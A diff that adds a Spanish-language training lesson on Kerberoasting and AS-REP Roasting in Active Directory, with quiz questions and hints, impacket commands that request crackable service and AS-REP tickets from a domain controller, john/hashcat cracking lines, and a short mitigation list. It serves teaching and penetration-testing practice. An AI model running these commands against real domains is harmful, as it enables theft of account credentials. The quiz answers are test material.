@@ -1,0 +1,64 @@
+---
+index: 2
+title: "Kerberoasting y AS-REP Roasting: robar tickets"
+questions:
+  - id: active-directory-ataque-t02-q01
+    prompt: "¿Qué ataque pide tickets de servicio (TGS) de cuentas con SPN y los crackea offline?"
+    hint: "Kerberoasting ( GetUserSPNs de impacket)."
+    kind: text
+  - id: active-directory-ataque-t02-q02
+    prompt: "¿Qué condición debe tener una cuenta para ser vulnerable a AS-REP Roasting?"
+    hint: "Sin pre-autenticación Kerberos (DONT_REQ_PREAUTH)."
+    kind: text
+  - id: active-directory-ataque-t02-q03
+    prompt: "¿Por qué Kerberoasting es 'silencioso' para el atacante?"
+    hint: "El DC NO puede distinguir la petición de una legítima."
+    kind: choice
+    options:
+      - id: a
+        label: "Porque usa el puerto 443"
+      - id: b
+        label: "Pedir un TGS es una operación Kerberos normal; el DC no puede distinguir intención maliciosa, y el cracking es offline"
+      - id: c
+        label: "Porque borra los logs"
+      - id: d
+        label: "Porque va cifrado"
+---
+
+## Kerberoasting: el ataque elegante
+
+Recuerda Kerberos (CS101): pides un **TGT**, luego un **TGS** para cada servicio.
+El TGS va cifrado con la CONTRASEÑA de la cuenta del servicio.
+
+**Kerberoasting**: pides TGS de cuentas de servicio (con SPN registrado) y los
+crackeas OFFLINE con john/hashcat:
+
+```bash
+# Con impacket (desde Linux):
+GetUserSPNs.py corp.local/usuario:password -dc-ip 10.10.10.10 -request
+# Output: $krb5tgs$23$*svc_sql$CORP.LOCAL*... (hash crackeable)
+
+# Cracking:
+john --wordlist=rockyou.txt hashes.txt
+hashcat -m 13100 hashes.txt rockyou.txt
+```
+
+**Por qué funciona**: el DC entrega el TGS alegremente a CUALQUIER usuario autenticado.
+No sabe que lo vas a crackear en tu máquina. Zero huella en el DC.
+
+## AS-REP Roasting: sin contraseña inicial
+
+Cuentas configuradas SIN pre-autenticación (`DONT_REQ_PREAUTH`): puedes pedir su
+AS-REP directamente (sin conocer su contraseña) — y el AS-REP contiene material
+cifrada con la contraseña de la cuenta → crackeable offline.
+
+```bash
+GetNPUsers.py corp.local/ -usersfile users.txt -no-pass -dc-ip 10.10.10.10
+```
+
+## Mitigación (para el informe)
+
+- Cuentas de servicio con contraseñas LARGAS (25+ chars) o mejor: **gMSA** (group
+  Managed Service Accounts, contraseñas automáticas rotadas).
+- Deshabilitar `DONT_REQ_PREAUTH` en todas las cuentas.
+- Monitoring: alertar de peticiones masivas de TGS de un solo usuario.
